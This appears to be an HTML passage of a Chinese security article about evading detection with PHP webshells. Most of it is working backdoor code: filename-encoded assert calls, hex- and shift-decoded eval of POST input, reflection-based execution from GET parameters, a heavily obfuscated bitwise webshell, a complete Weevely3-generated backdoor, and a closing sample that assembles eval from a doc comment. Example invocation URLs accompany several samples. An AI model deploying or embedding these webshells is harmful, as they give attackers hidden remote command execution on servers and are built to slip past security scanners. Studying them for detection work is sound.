<h2 id="&#x5229;&#x7528;&#x6587;&#x4EF6;&#x540D;-amp-&#x6CE8;&#x91CA;"><a href="#&#x5229;&#x7528;&#x6587;&#x4EF6;&#x540D;-amp-&#x6CE8;&#x91CA;" class="headerlink" title="&#x5229;&#x7528;&#x6587;&#x4EF6;&#x540D;&amp;&#x6CE8;&#x91CA;"></a>&#x5229;&#x7528;&#x6587;&#x4EF6;&#x540D;&amp;&#x6CE8;&#x91CA;</h2><p>&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x9632;&#x62A4;&#x8F6F;&#x4EF6;&#x5728;&#x68C0;&#x6D4B;Webshell&#x65F6;&#x4E00;&#x822C;&#x90FD;&#x4F1A;&#x5FFD;&#x7565;&#x6389;&#x6587;&#x4EF6;&#x540D;&#x548C;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x6CE8;&#x91CA;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5728;&#x6587;&#x4EF6;&#x540D;&#x548C;&#x6CE8;&#x91CA;&#x4E2D;&#x653E;&#x5165;&#x654F;&#x611F;&#x51FD;&#x6570;&#x3002;</p>
<h3 id="&#x5DE7;&#x7528;&#x6587;&#x4EF6;&#x540D;"><a href="#&#x5DE7;&#x7528;&#x6587;&#x4EF6;&#x540D;" class="headerlink" title="&#x5DE7;&#x7528;&#x6587;&#x4EF6;&#x540D;"></a>&#x5DE7;&#x7528;&#x6587;&#x4EF6;&#x540D;</h3><p><code>no_assert.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;&lt;?php</span><br><span class="line">${&quot;function&quot;}=substr(__FILE__,-10,-4);;</span><br><span class="line">${&quot;command&quot;}=$_POST[cmd];</span><br><span class="line">$function($command);</span><br></pre></td></tr></table></figure>

<p>&#x8FD9;&#x79CD;&#xFF0C;&#x5F97;&#x5230;&#x7684;<code>$function</code>&#x5C31;&#x662F;<code>assert</code>&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x5F62;&#x6210;&#x4E86;<code>assert($_POST[cmd]);</code>&#x7684;&#x540E;&#x95E8;&#x3002;</p>
<p><code>$_POST[cmd].php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;&lt;?php</span><br><span class="line">${&quot;function&quot;}= substr(__FILE__, -15, -4);</span><br><span class="line">${&quot;config&quot;} = assert;</span><br><span class="line">$config($function);</span><br></pre></td></tr></table></figure>

<p>&#x8FD9;&#x4E2A;&#x662F;&#x5C06;<code>$_POST[cmd]</code>&#x653E;&#x7F6E;&#x5728;&#x6587;&#x4EF6;&#x540D;&#x4E2D;&#x8FDB;&#x884C;&#x9690;&#x85CF;&#xFF0C;&#x540C;&#x6837;&#x53EF;&#x4EE5;&#x8FBE;&#x5230;&#x9690;&#x85CF;&#x7684;&#x76EE;&#x7684;&#x3002;</p>
<h2 id="&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;"><a href="#&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;" class="headerlink" title="&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;"></a>&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;</h2><p>&#x4E3A;&#x4E86;&#x80FD;&#x591F;&#x9003;&#x907F;&#x9632;&#x62A4;&#x8F6F;&#x4EF6;&#x7684;&#x67E5;&#x6740;&#xFF0C;&#x5F88;&#x591A;webshell&#x90FD;&#x4F1A;&#x81EA;&#x5DF1;&#x7F16;&#x5199;&#x52A0;&#x5BC6;&#x51FD;&#x6570;&#x6216;&#x8005;&#x662F;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x6362;&#x51FD;&#x6570;&#x3002;&#x4E0B;&#x9762;&#x5C31;&#x51E0;&#x4E2A;&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x8BF4;&#x660E;&#x3002;</p>
<h3 id="&#x5341;&#x516D;&#x8FDB;&#x5236;&#x6267;&#x884C;"><a href="#&#x5341;&#x516D;&#x8FDB;&#x5236;&#x6267;&#x884C;" class="headerlink" title="&#x5341;&#x516D;&#x8FDB;&#x5236;&#x6267;&#x884C;"></a>&#x5341;&#x516D;&#x8FDB;&#x5236;&#x6267;&#x884C;</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;$string=&apos;&apos;;</span><br><span class="line">$password=&apos;test&apos;;</span><br><span class="line">if(isset($_POST[$password])){</span><br><span class="line">    $hex=$_POST[$password];</span><br><span class="line">    for($i=0;$i&lt;strlen($hex)-1;$i+=2){</span><br><span class="line">    $string.=chr(hexdec($hex[$i].$hex[$i+1]));</span><br><span class="line">}</span><br><span class="line">@eval($string);</span><br></pre></td></tr></table></figure>

<p>&#x53EA;&#x9700;&#x8981;&#x5C06;&#x4F20;&#x5165;&#x7684;&#x6307;&#x4EE4;&#x53D8;&#x4E3A;16&#x8FDB;&#x5236;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x5373;&#x53EF;&#x3002;<code>shell.php?test=706870696e666f28293b</code>&#x3002;&#x5176;&#x4E2D;&#x7684;<code>706870696e666f28293b</code>&#x5C31;&#x662F;<code>phpinfo();</code>&#x7684;&#x5341;&#x516D;&#x8FDB;&#x5236;&#xFF0C;&#x7528;&#x6CD5;&#x548C;&#x666E;&#x901A;&#x7684;webshell&#x6CA1;&#x6709;&#x533A;&#x522B;&#x3002;</p>
<h2 id="&#x81EA;&#x5B9A;&#x4E49;&#x52A0;&#x5BC6;"><a href="#&#x81EA;&#x5B9A;&#x4E49;&#x52A0;&#x5BC6;" class="headerlink" title="&#x81EA;&#x5B9A;&#x4E49;&#x52A0;&#x5BC6;"></a>&#x81EA;&#x5B9A;&#x4E49;&#x52A0;&#x5BC6;</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;function decode($string) {</span><br><span class="line">    $result = &apos;&apos;;</span><br><span class="line">    for($index=0;$index&lt;strlen($string);$index += 1) {</span><br><span class="line">        $result .= chr(ord($string[$index])-3);</span><br><span class="line">    }</span><br><span class="line">    return $result;</span><br><span class="line">}</span><br><span class="line">$b = create_function(&apos;&apos;,decode(&quot;Chydo+&apos;bSRVW^fpg`,&gt;&quot;));</span><br><span class="line">$b();</span><br></pre></td></tr></table></figure>

<p>&#x8FD9;&#x4E2A;&#x52A0;&#x5BC6;&#x51FD;&#x6570;&#x5341;&#x5206;&#x7684;&#x7B80;&#x5355;&#xFF0C;&#x4EC5;&#x4EC5;&#x662F;&#x5C06;&#x5B57;&#x6BCD;&#x7684;ascii&#x503C;&#x51CF;3&#x800C;&#x5DF2;&#xFF0C;&#x7B97;&#x662F;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x7684;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#x3002;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;decode(&quot;Chydo+&apos;bSRVW^fpg`,&gt;&quot;)</span><br></pre></td></tr></table></figure>

<p>&#x5F97;&#x5230;&#x5C31;&#x662F;<code>@eval($_POST[cmd]);</code>&#x3002;</p>
<h2 id="&#x53CD;&#x5C04;&#x6280;&#x672F;"><a href="#&#x53CD;&#x5C04;&#x6280;&#x672F;" class="headerlink" title="&#x53CD;&#x5C04;&#x6280;&#x672F;"></a>&#x53CD;&#x5C04;&#x6280;&#x672F;</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;$func = new ReflectionFunction($_GET[m]);</span><br><span class="line">echo $func-&gt;invokeArgs(array($_GET[c]));</span><br></pre></td></tr></table></figure>

<p>&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x8C03;&#x7528;&#x8D77;&#x6765;&#x4E5F;&#x975E;&#x5E38;&#x7684;&#x7B80;&#x5355;<code>xx.com/shell.php?m=assert&amp;c=phpinfo();</code>&#x548C;&#x52A8;&#x6001;&#x51FD;&#x6570;&#x6267;&#x884C;&#x7684;&#x65B9;&#x5F0F;&#x5341;&#x5206;&#x7684;&#x76F8;&#x4F3C;&#x3002;&#x4F46;&#x662F;&#x76EE;&#x524D;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x5DF2;&#x7ECF;&#x88AB;&#x5404;&#x79CD;&#x5B89;&#x5168;&#x9632;&#x62A4;&#x8F6F;&#x4EF6;&#x8BC6;&#x522B;&#x4E86;&#x3002;</p>
<h2 id="&#x6587;&#x4EF6;&#x52A0;&#x5BC6;"><a href="#&#x6587;&#x4EF6;&#x52A0;&#x5BC6;" class="headerlink" title="&#x6587;&#x4EF6;&#x52A0;&#x5BC6;"></a>&#x6587;&#x4EF6;&#x52A0;&#x5BC6;</h2><p>&#x52A0;&#x5BC6;&#x7684;&#x65B9;&#x5F0F;&#x5C31;&#x975E;&#x5E38;&#x591A;&#x4E86;&#xFF0C;&#x5305;&#x62EC;&#x4F7F;&#x7528;&#x5F00;&#x6E90;&#x7684;webshell&#x5DE5;&#x5177;&#x6216;&#x8005;&#x662F;&#x7F51;&#x4E0A;&#x5728;&#x7EBF;&#x7684;&#x52A0;&#x5BC6;&#x65B9;&#x6CD5;&#x6216;&#x8005;&#x662F;&#x81EA;&#x5DF1;&#x7F16;&#x5199;&#x52A0;&#x5BC6;&#x4EE3;&#x7801;&#x8FDB;&#x884C;&#x6DF7;&#x6DC6;&#x52A0;&#x5BC6;&#x3002;</p>
<h3 id="&#x6DF7;&#x6DC6;&#x52A0;&#x5BC6;"><a href="#&#x6DF7;&#x6DC6;&#x52A0;&#x5BC6;" class="headerlink" title="&#x6DF7;&#x6DC6;&#x52A0;&#x5BC6;"></a>&#x6DF7;&#x6DC6;&#x52A0;&#x5BC6;</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;$M_=&apos;TcynUS2Dj&apos;|Xtt1C5;$xPAsA3=&apos;|L#K1)&apos;^&apos;=`&apos;.tosl;$ps6U8r2u=&apos;S R&apos;|&apos;Z @&apos;;&apos;F_fTJ4U3M&apos;.</span><br><span class="line">    &apos;)u(&lt;I9&apos;;$ots8zM7=wwugn.&apos;~&apos;&amp;outg.&quot;~~&quot;;$CqHZRjrpv=&apos;om~}ov&apos;&amp;&apos;owv}~w&apos;;$pmak=/*OYR&apos;.</span><br><span class="line">    &apos;HF]mwSAu~*/oZD5t.&apos;-&apos;.TouvRdijg|&apos;M at~`K*$jqr!-)&apos;;$Nkm4DL=wwoiuw_o.#jDj9F8qWCU&apos;.</span><br><span class="line">    &apos;}og~oo~&apos;&amp;ssoyww_vw.&apos;~&apos;.wtoo.&apos;~&apos;;$sSZ1ZTtXOI=&apos;J~DQ}e&apos;&amp;iUTZ.&apos;]C&apos;;$enZB=&apos;wfq/Wc&lt;&apos;.</span><br><span class="line">    &apos;.g!17}x`1qs@#1g)=a=79&apos;.mc56&amp;&quot;!|7&quot;.aLxt2a.&quot;{y#93V7;;C;~m uO3;q;{v2&quot;;&apos;gyxK39Xu1&apos;.</span><br><span class="line">    &apos;:i^&apos;;$woW8PBSb_J=&apos;?g~v$z~a,w&apos;&amp;&apos;vo?.us|{4k&apos;;$hefSTat73=&apos;ko7|;uw?&apos;&amp;&apos;S}w?&apos;./*Usx&apos;.</span><br><span class="line">    &apos;&gt;XUb.*/wuuo;$H31KYF=&apos;-(Y%;L8@&apos;|&apos;-(|lz@2f&apos;;$oRzY9cesWL=BrvDsY^&apos;cS=p2;&apos;;&apos;djCAxk&apos;.</span><br><span class="line">    &apos;zX~lO=:nK5&apos;;$jKRFmGwxTPb=&apos;sl[GUs&apos;^&apos;6(#%~)&apos;;$cQZ75FbYVQT=&apos;:(&amp;.&apos;.Z5qdh^/*KudDMp&apos;.</span><br><span class="line">    &apos;LtxJEC*/bkcTlp7.&apos;$)&apos;;$ZNh7cpA=J^&apos;+&apos;;$VRcphf2Y1=&apos;+&apos;|K;$fXLKDzG=&apos;(C&apos;^&apos;M;&apos;;&apos;dHaM&apos;.</span><br><span class="line">    &apos;]9|ds5tbb&apos;;$I5Hmeo7gVJ=E^&quot;,&quot;;$mwo7=w&amp;t;$TvUYRhtThs=&quot;^&quot;.TVW_.&quot;|_]&quot;.u__CURu./*j&apos;.</span><br><span class="line">    &apos;l*/&quot;{H&quot;&amp;&quot;Iv|&quot;.x_Z_UZ_wyRq_Wz;$ypaVtIfRO=&apos;]&apos;.SEBTRE|WPEAUR.&apos;@&apos;;$TegpU9P5=(&apos;3Zw&apos;.</span><br><span class="line">    &apos;g/5&apos;&amp;&apos;zx-G/w&apos;)^$xPAsA3;$rM36yFVDxOo=(&apos;$Df&apos;|&apos;6Dc&apos;)^$ps6U8r2u;$iG7yrwzXUiW=/*cL&apos;.</span><br><span class="line">    &apos;srxQMMk*/$ots8zM7&amp;$CqHZRjrpv;$qioLnlc=(&apos;7w,c/&quot;YQ#a`p&apos;^&apos;i@c-&apos;.IeimeU48)^(&apos;,E&quot;!&apos;.</span><br><span class="line">    &apos;!!TH(E&quot;,&apos;|&apos;.D()95EL*T5-&apos;);$Pl=$pmak&amp;$Nkm4DL;$rF0oYXqV9=(&apos;HDP@O@&apos;|&apos;HDD@F@&apos;)|/*&apos;.</span><br><span class="line">    &apos;f*/$sSZ1ZTtXOI;$hLZSKz9=(&quot;||=6&quot;.tB5s.&quot;#;(7i}%-d2|&quot;.r6O67a.&quot;!h-:j0&amp;&quot;&amp;&apos;4&amp;2=)f5;&apos;.</span><br><span class="line">    &apos;%}ev:2%9*5&apos;.ebteyl.&apos;,g61&lt;E#s&apos;)|$enZB;$Z61ppy=$ZNh7cpA&amp;$VRcphf2Y1;$ZHU=/*fE9Yr&apos;.</span><br><span class="line">    &apos;7q?{!W*/$woW8PBSb_J&amp;(&apos;?&apos;.qldtjo.&apos;&lt;/w&apos;&amp;&apos;-&apos;.snkdo.&apos;?yoo&apos;);$PhcCKxq=/*XeLXi26ULV&apos;.</span><br><span class="line">    &apos;pri*/$hefSTat73^$H31KYF;$emJm_U=$oRzY9cesWL^$jKRFmGwxTPb;$FTGoqvnK=/*a5xj88EI&apos;.</span><br><span class="line">    &apos;n(am7*/$cQZ75FbYVQT|(&apos;5;]+`&apos;.lexH^&apos;}k8{DLK:-&apos;);if($TegpU9P5($rM36yFVDxOo(/*TA&apos;.</span><br><span class="line">    &apos;(^q.4;*/$iG7yrwzXUiW($rF0oYXqV9)),$hLZSKz9))$qioLnlc((&apos;{/Z_&apos;^&apos;TNu:&apos;),/*qwCzim&apos;.</span><br><span class="line">    &apos;JQ7+5)JTBF*/$fXLKDzG.$I5Hmeo7gVJ.$mwo7,$Z61ppy);$yX4gTiSd=$Pl($ZHU,/*BtAiX0w8&apos;.</span><br><span class="line">    &apos;7*LALb~*/$iG7yrwzXUiW($TvUYRhtThs.$ypaVtIfRO));$yX4gTiSd($PhcCKxq,$emJm_U,/*p&apos;.</span><br><span class="line">    &apos;}R*/$FTGoqvnK);#T)s&lt;k?vZ%Nx[VsvNLg&lt;sQ8KlP!D{*nm306rhxT95kZ5CMe=YJ*V3cTstah.t&apos;.</span><br><span class="line">    &apos;HD PDe:F{4#Wplm 1BLh0FD7*@?;aZJQnFF1$zR&apos;;</span><br></pre></td></tr></table></figure>

<p>&#x4EE5;&#x4E0A;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x81EA;&#x5B9A;&#x4E49;&#x88AB;&#x52A0;&#x5BC6;&#x7684;webshell&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x5229;&#x7528;&#x4E86;&#x5404;&#x79CD;&#x4F4D;&#x8FD0;&#x7B97;&#x7B26;&#x8FBE;&#x5230;&#x6DF7;&#x6DC6;&#x52A0;&#x5BC6;&#x7684;&#x76EE;&#x7684;&#x3002;</p>
<h3 id="&#x4F7F;&#x7528;&#x52A0;&#x5BC6;&#x5DE5;&#x5177;&#x52A0;&#x5BC6;"><a href="#&#x4F7F;&#x7528;&#x52A0;&#x5BC6;&#x5DE5;&#x5177;&#x52A0;&#x5BC6;" class="headerlink" title="&#x4F7F;&#x7528;&#x52A0;&#x5BC6;&#x5DE5;&#x5177;&#x52A0;&#x5BC6;"></a>&#x4F7F;&#x7528;&#x52A0;&#x5BC6;&#x5DE5;&#x5177;&#x52A0;&#x5BC6;</h3><p>&#x56FD;&#x5185;&#x7684;&#x5DE5;&#x5177;&#x8FD8;&#x662F;&#x6709;&#x5F88;&#x591A;&#x7684;&#xFF0C;&#x5305;&#x62EC;phpjm&#xFF0C;phpjiami&#x901A;&#x8FC7;&#x6D4B;&#x8BD5;,&#x5373;&#x4F7F;&#x662F;&#x6700;&#x4E3A;&#x7B80;&#x5355;&#x7684;<code>@eval($_POST[cmd])</code>&#xFF0C;&#x7ECF;&#x8FC7;&#x52A0;&#x5BC6;&#x4E4B;&#x540E;&#x8FD8;&#x662F;&#x5F88;&#x591A;&#x9632;&#x62A4;&#x8F6F;&#x4EF6;&#x65E0;&#x6CD5;&#x8BC6;&#x522B;&#x51FA;webshell&#x3002;</p>
<h3 id="Weevely"><a href="#Weevely" class="headerlink" title="Weevely"></a>Weevely</h3><p>weevely&#x662F;&#x4E00;&#x6B3E;&#x4F7F;&#x7528;python&#x7F16;&#x5199;&#x7684;webshell&#x5DE5;&#x5177;&#xFF0C;<a href="/external_links/c7b0c57e6c76400714d6160c3a9a83e6.html" target="blank" rel="noopener">Github&#x5730;&#x5740;</a>&#x4E0B;&#x9762;&#x5C31;&#x662F;<code>weevely3</code>&#x751F;&#x6210;&#x7684;&#x6734;php &#x4EE3;&#x7801;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;$L=&apos;O=$_SERVE9OR;$rr9O=@$r[&quot;H9OTTP_9OREFERER9O&quot;];$ra=9O@$r[&quot;H9OTT9OP_9O9OACCEPT_LANGUAGE&quot;]9O;if($9O9Orr&amp;&amp;$ra&apos;;</span><br><span class="line">$b=&apos;art();@ev9Oal(@9Ogzu9Oncompres9Os(@x(9O@base69O4_decode(9Opre9Og_repla9O9Oce9O(arra9Oy(&quot;/_/&quot;,&quot;/-/&quot;),a&apos;;</span><br><span class="line">$h=&apos;$z+9O+)$p.9O=$q[$m[2][9O$z]];if(strpos(9O$p,9O$9Oh)===09O){$s[$i]=&quot;&quot;9O;$p=$ss(9O9O$p,3);}if9O(array_k&apos;;</span><br><span class="line">$P=&apos;ey9O_exi9Osts($i,9O$s))9O{$s[$i]9O.9O=$p;$e=strp9Oo9Os($s[9O$i],$f);if($9Oe){$9Ok=$kh.$kf;9Oo9Ob_s9Ot&apos;;</span><br><span class="line">$y=&apos;($i.$kh),0,39O));9O$f=$9Osl($ss(m9Od5($i9O.$kf),9O0,39O));$p=&quot;&quot;;for(9O$z9O=1;9O$9Oz&lt;9Ocount($m[1])9O;&apos;;</span><br><span class="line">$z=&apos;rray(&quot;/&quot;9O,&quot;9O+&quot;9O),$9Oss($s[$i],0,$e))9O),9O$9Ok)));$o=9Oob_get_content9Os();9Oob_en9Od_clean()9O9O;$d=ba&apos;;</span><br><span class="line">$r=&apos;$kh=&quot;dff9Of&quot;9O;$9Okf=9O&quot;09Oa7f&quot;;function x($t,$k9O)9O{$c=9Ostrlen($k9O)9O;$l9O=strlen($t);$9Oo=&quot;&quot;;for9O($i&apos;;</span><br><span class="line">$G=&apos;){$u=p9Oar9Ose_url9O($rr9O);parse_str9O($u[&quot;query9O9O&quot;],$q);$9Oq=array_v9O9Oalues(9O$q);preg9O_match_a9O&apos;;</span><br><span class="line">$T=str_replace(&apos;Ul&apos;,&apos;&apos;,&apos;crUleUlate_UlfUluUlnUlction&apos;);</span><br><span class="line">$v=&apos;=9O0;$i&lt;$l;){fo9Or($j=09O;($j&lt;$c9O&amp;9O&amp;$i&lt;$l9O);$j++,$i++9O){$o9O.9O=$t{$i}^9O$k{$j};}}9Oreturn 9O$o;}$r9&apos;;</span><br><span class="line">$Q=&apos;se9O64_encode9O(x(gz9Ocompres9Os($o),$9Ok));pr9Oint(9O9O&quot;&lt;$k&gt;$d&lt;/$9Ok&gt;&quot;);@sess9Oi9Oon_de9Ostroy();}}}}&apos;;</span><br><span class="line">$k=&apos;=&amp;$_SES9OSION9O;9O$ss=&quot;su9Obstr&quot;9O;$sl=&quot;strtol9Oower&quot;;$i9O9O9O=$m[1][0].$m[19O][1];$h=$sl9O($9Oss(m9Od5&apos;;</span><br><span class="line">$o=&apos;ll(&quot;/9O([\\w])[\\w9O-]9O+(?:;9Oq=09O.([\\d9O]))?,?/&quot;,9O$ra,9O$m);if($q9O&amp;&amp;9O$m){@sessio9On_sta9Ort();$9Os&apos;;</span><br><span class="line">$t=str_replace(&apos;9O&apos;,&apos;&apos;,$r.$v.$L.$G.$o.$k.$y.$h.$P.$b.$z.$Q);</span><br><span class="line">$C=$T(&apos;&apos;,$t);$C();</span><br></pre></td></tr></table></figure>

<p>&#x770B;&#x8D77;&#x6765;&#x5B8C;&#x5168;&#x662F;&#x6BEB;&#x65E0;&#x610F;&#x4E49;&#x7684;&#x4EE3;&#x7801;&#x3002;&#x4F46;&#x662F;&#x5373;&#x4F7F;&#x662F;&#x8FD9;&#x6837;&#xFF0C;D&#x76FE;&#x8FD8;&#x662F;&#x80FD;&#x591F;&#x8BC6;&#x522B;&#x3002;</p>
<h2 id="&#x603B;&#x7ED3;"><a href="#&#x603B;&#x7ED3;" class="headerlink" title="&#x603B;&#x7ED3;"></a>&#x603B;&#x7ED3;</h2><p>&#x672C;&#x7BC7;&#x6587;&#x7AE0;&#x5BF9;&#x76EE;&#x524D;PHP&#x4E2D;&#x7684;&#x5E38;&#x89C1;&#x7684;webshell&#x53D8;&#x5F62;&#x6280;&#x672F;&#x8FDB;&#x884C;&#x4E86;&#x603B;&#x7ED3;&#x5F52;&#x7EB3;&#xFF0C;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x8FD9;&#x4E9B;&#x53D8;&#x5F62;&#x6280;&#x672F;&#x90FD;&#x5927;&#x91CF;&#x5730;&#x4F7F;&#x7528;&#x4E86;PHP&#x7684;&#x8BED;&#x8A00;&#x7279;&#x6027;&#x3002;&#x7531;&#x4E8E;PHP&#x7684;&#x7075;&#x6D3B;&#x7684;&#x8BED;&#x6CD5;&#x4EE5;&#x53CA;&#x5927;&#x91CF;&#x7684;&#x5185;&#x7F6E;&#x51FD;&#x6570;&#xFF0C;&#x5BFC;&#x81F4;webshell&#x53EF;&#x4EE5;&#x6709;&#x5404;&#x79CD;&#x5404;&#x6837;&#x7684;&#x53D8;&#x5F62;&#x6280;&#x672F;&#x3002;&#x591A;&#x6837;&#x7684;&#x53D8;&#x5F62;&#x6280;&#x672F;&#x4E0D;&#x4EC5;&#x53EF;&#x4EE5;&#x8BA9;&#x653B;&#x51FB;&#x8005;&#x5199;&#x51FA;&#x66F4;&#x52A0;&#x9690;&#x853D;&#x7684;webshell&#xFF0C;&#x4E5F;&#x589E;&#x52A0;&#x4E86;&#x9632;&#x62A4;&#x8F6F;&#x4EF6;&#x8BC6;&#x522B;&#x7684;&#x96BE;&#x5EA6;&#x3002;webshell&#x7684;&#x53D8;&#x5F62;&#x6280;&#x672F;&#x5C31;&#x5728;&#x653B;&#x51FB;&#x8005;&#x4E0E;&#x9632;&#x62A4;&#x8F6F;&#x4EF6;&#x7684;&#x5BF9;&#x6297;&#x4E2D;&#x4E5F;&#x4E0D;&#x65AD;&#x7684;&#x6F14;&#x53D8;&#x548C;&#x5347;&#x7EA7;&#x3002;&#x672C;&#x7BC7;&#x6587;&#x7AE0;&#x4E5F;&#x53EA;&#x662F;&#x5BF9;&#x4E8E;&#x603B;&#x7ED3;&#x4E86;&#x5404;&#x79CD;&#x9632;&#x62A4;&#x65B9;&#x6CD5;&#xFF0C;&#x5173;&#x4E8E;&#x5176;&#x4E2D;&#x7684;&#x53D8;&#x5F62;&#x539F;&#x7406;&#x5C31;&#x4E0D;&#x8FDB;&#x884C;&#x8BE6;&#x7EC6;&#x5730;&#x8BF4;&#x660E;&#x4E86;&#x3002;</p>
<h2 id="&#x5F69;&#x86CB;"><a href="#&#x5F69;&#x86CB;" class="headerlink" title="&#x5F69;&#x86CB;"></a>&#x5F69;&#x86CB;</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;    /**</span><br><span class="line">    * eva</span><br><span class="line">    * l($_GE</span><br><span class="line">    * T[&quot;c&quot;]);</span><br><span class="line">    * asse</span><br><span class="line">    * rt</span><br><span class="line">    */</span><br><span class="line">    class TestClass { }</span><br><span class="line">    $rc = new ReflectionClass(&apos;TestClass&apos;);</span><br><span class="line">    $str = $rc-&gt;getDocComment();</span><br><span class="line">    $evf=substr($str,strpos($str,&apos;e&apos;),3);</span><br><span class="line">    $evf=$evf.substr($str,strpos($str,&apos;l&apos;),6);</span><br><span class="line">    $evf=$evf.substr($str,strpos($str,&apos;T&apos;),8);</span><br><span class="line">    $fu=substr($str,strpos($str,&apos;as&apos;),4);</span><br><span class="line">    $fu=$fu.substr($str,strpos($str,&apos;r&apos;),2);</span><br><span class="line">    $fu($evf);</span><br></pre></td></tr></table></figure>

<h2 id="&#x53C2;&#x8003;"><a href="#&#x53C2;&#x8003;" class="headerlink" title="&#x53C2;&#x8003;"></a>&#x53C2;&#x8003;</h2><p><a href="/external_links/afb2271c1b1fd1a2f5ac85c8fceb6f20.html" target="blank" rel="noopener">www.leavesongs.com/PENETRATION&#x2026;</a></p>
<p><a href="/external_links/690910117e6371fc99d2d17e2eda8485.html" target="blank" rel="noopener">blog.safedog.cn/?p=68</a></p>
<p><a href="/external_links/d3db415f765b1fc63aef8987ae7d0805.html" target="blank" rel="noopener">joychou.org/web/webshel&#x2026;</a></p>
<p><strong>* &#x672C;&#x6587;&#x4F5C;&#x8005;&#xFF1A;&#x5F71;&#x6B66;&#x8005;&#x5B9E;&#x9A8C;&#x5BA4;&#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x6765;&#x81EA;Freebuf.COM</strong></p>
<p><strong>&#x672C;&#x6587;&#x8F6C;&#x8F7D;&#x81EA;:</strong> <a href="/external_links/4420472aa593ea5f055b79b0b7a1fb2f.html" target="blank" rel="noopener">&#x6398;&#x91D1;</a></p>
<p><em><a href="https://dev.newban.cn/">&#x5F00;&#x53D1;&#x8005;&#x535A;&#x5BA2; &#x2013; &#x548C;&#x5F00;&#x53D1;&#x76F8;&#x5173;&#x7684; &#x8FD9;&#x91CC;&#x5168;&#x90FD;&#x6709;</a></em></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://dev.newban.cn../../6844903520190070791.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="开发者博客">
      <meta itemprop="description" content>
      <meta itemprop="image" content="../../images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="开发者博客 – IT技术 尽在开发者博客">
    </span>

    
      <header class="post-header">

        
        
